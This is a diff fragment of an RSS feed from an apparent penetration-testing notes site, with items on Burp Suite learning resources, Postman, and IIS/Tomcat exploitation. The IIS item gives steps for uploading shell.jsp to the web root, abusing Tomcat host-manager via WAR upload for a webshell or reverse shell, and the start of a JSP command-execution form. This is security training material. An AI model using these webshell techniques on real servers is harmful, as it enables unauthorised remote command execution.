+Resources to check # Complete MOOC style course (subscribing but it&amp;#39;s free) (2 links are the same course) https://www.udemy.com/burp-suite/ https://hackademy.aetherlab.net/p/burp-suite # Video course https://www.tutorialspoint.com/burpsuite/index.asp # Kinda detailed tutorial (text + pictures) https://www.pentestgeek.com/web-applications/burp-suite-tutorial-1 https://www.pentestgeek.com/web-applications/how-to-use-burp-suite # Fast course/tutorial (text + images) https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-2 https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-3 https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-4 # ??? https://portswigger.net/web-security # Conferences slides https://fr.slideshare.net/ZackMeyers/web-hacking-with-burp-suite-101 # Not free (but it seems to have a kind of 10 days free ?</description>
+    </item>
+    
+    <item>
+      <title>IIS</title>
+      <link>/windows-systems/exploitation/iis/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/exploitation/iis/</guid>
+      <description>Tips &amp;amp; Tricks # Two interfaces for tomcat /manager /host-manager# default root for IIS is C:\inetpub\wwwroot # Instead of using complicated relative path of the application use that one. # Upload to: C:\inetpub\wwwroot\shell.jsp curl http://13.33.3.37/shell.jsp 
+Exploitng Host-Manager https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/ # You can exploit this and get a webshell or even reverse shell by uploading a WAR file # index.jsp &amp;lt;FORM METHOD=GET ACTION=&amp;#39;index.jsp&amp;#39;&amp;gt; &amp;lt;INPUT name=&amp;#39;cmd&amp;#39; type=text&amp;gt; &amp;lt;INPUT type=submit value=&amp;#39;Run&amp;#39;&amp;gt; &amp;lt;/FORM&amp;gt; &amp;lt;%@ page import=&amp;#34;java.</description>
     </item>
     
     <item>
@@ -1164,7 +1216,8 @@ Identification # Port 139 # Using nbtscan to identify host/domain nbtscan IP (id
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/postman/</guid>
-      <description>https://www.guru99.com/postman-tutorial.html https://openclassrooms.com/fr/courses/4668056-construisez-des-microservices/5123020-testez-votre-api-grace-a-postman https://www.toolsqa.com/postman-tutorial/ https://amethyste16.wordpress.com/2016/02/24/tutoriel-postman/ User Interface Header # Import --&amp;gt; Used to import collection or environment. # Runner --&amp;gt; Automation tests can be executed through the Collection Runner. # Workspace --&amp;gt; You can divide work using workspaces Sidebar # History --&amp;gt; Past requests that you have sent will be displayed in History. # This makes it easy to track actions that you have done. # Organize --&amp;gt; your test suite by creating collections.</description>
+      <description>https://www.guru99.com/postman-tutorial.html https://openclassrooms.com/fr/courses/4668056-construisez-des-microservices/5123020-testez-votre-api-grace-a-postman https://www.toolsqa.com/postman-tutorial/ https://amethyste16.wordpress.com/2016/02/24/tutoriel-postman/ 
+User Interface Header # Import --&amp;gt; Used to import collection or environment. # Runner --&amp;gt; Automation tests can be executed through the Collection Runner. # Workspace --&amp;gt; You can divide work using workspaces Sidebar # History --&amp;gt; Past requests that you have sent will be displayed in History. # This makes it easy to track actions that you have done. # Organize --&amp;gt; your test suite by creating collections.</description>
     </item>
     
     <item>
